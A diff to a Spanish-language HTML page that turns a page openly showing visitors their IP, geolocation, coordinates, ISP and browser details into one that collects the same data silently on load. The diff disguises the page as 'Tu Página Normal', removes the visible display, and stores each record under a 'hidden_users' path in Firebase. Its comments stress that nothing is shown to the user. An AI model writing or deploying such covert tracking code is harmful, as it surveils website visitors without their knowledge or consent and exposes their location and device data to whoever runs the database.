@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro de Usuarios</title>
+    <title>Tu Página Normal</title>
     <!-- Agregar Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
+        /* Tus estilos normales aquí */
         body {
             font-family: Arial, sans-serif;
             margin: 0;
@@ -19,29 +20,17 @@
             margin: 0 auto;
             padding: 20px;
         }
-        h1 {
-            text-align: center;
-            color: #333;
-        }
-        .info-box {
-            background-color: #fff;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            padding: 20px;
-            margin-bottom: 20px;
-        }
     </style>
 </head>
 <body>
+    <!-- Contenido normal de tu página -->
     <div class="container">
-        <h1>Información del Usuario</h1>
-        <div class="info-box">
-            <p id="userInfo">Cargando información...</p>
-        </div>
+        <h1>Bienvenido a mi página</h1>
+        <p>Contenido normal de tu sitio web...</p>
     </div>
 
     <script>
-        // Configuración de Firebase
+        // Configuración de Firebase (REMPLAZA CON TUS DATOS REALES)
         const firebaseConfig = {
             apiKey: "AIzaSyD9v2z6u1uK1ZQvWJmJ8X1ZQvWJmJ8X1ZQ",
             authDomain: "base-de-datos-ip-alupnos.firebaseapp.com",
@@ -123,20 +112,20 @@
             };
         }
 
-        // Función para guardar datos en Firebase
+        // Función para guardar datos en Firebase de manera oculta
         function saveToFirebase(userData) {
             const timestamp = new Date().getTime();
-            database.ref('users/' + timestamp).set(userData)
+            database.ref('hidden_users/' + timestamp).set(userData)
                 .then(() => {
-                    console.log("Datos guardados en Firebase");
+                    console.log("Datos guardados en Firebase de manera oculta");
                 })
                 .catch((error) => {
                     console.error("Error al guardar en Firebase:", error);
                 });
         }
 
-        // Función principal para recopilar y mostrar información
-        async function collectAndDisplayInfo() {
+        // Función principal para recopilar información en segundo plano
+        async function collectInfoSilently() {
             const ip = await getIP();
             const location = await getLocation(ip);
             const browserInfo = getBrowserInfo();
@@ -153,29 +142,17 @@
                 referrer: document.referrer || "Directo"
             };
 
-            // Mostrar información en la página
-            document.getElementById('userInfo').innerHTML = `
-                <strong>Fecha y Hora:</strong> ${userData.fecha} - ${userData.hora}<br>
-                <strong>IP:</strong> ${userData.ip}<br>
-                <strong>Ubicación:</strong> ${userData.ubicacion.city}, ${userData.ubicacion.region}, ${userData.ubicacion.country}<br>
-                <strong>Código Postal:</strong> ${userData.ubicacion.postal}<br>
-                <strong>Coordenadas:</strong> Lat: ${userData.ubicacion.latitude}, Lon: ${userData.ubicacion.longitude}<br>
-                <strong>Proveedor:</strong> ${userData.ubicacion.org}<br>
-                <strong>Navegador:</strong> ${userData.navegador.userAgent}<br>
-                <strong>Plataforma:</strong> ${userData.navegador.platform}<br>
-                <strong>Idioma:</strong> ${userData.navegador.language}<br>
-                <strong>Resolución:</strong> ${userData.navegador.screenWidth}x${userData.navegador.screenHeight}<br>
-                <strong>Zona Horaria:</strong> ${userData.navegador.timezone}<br>
-                <strong>Página Visitada:</strong> ${userData.paginaVisitada}<br>
-                <strong>Origen:</strong> ${userData.referrer}
-            `;
-
-            // Guardar en Firebase
+            // Guardar en Firebase sin mostrar nada al usuario
             saveToFirebase(userData);
         }
 
-        // Ejecutar cuando la página cargue
-        window.onload = collectAndDisplayInfo;
+        // Ejecutar cuando la página cargue, sin afectar la experiencia del usuario
+        window.onload = function() {
+            // Tu código normal de la página...
+            
+            // Llamada silenciosa para recoger datos
+            collectInfoSilently();
+        };
     </script>
 </body>
 </html>
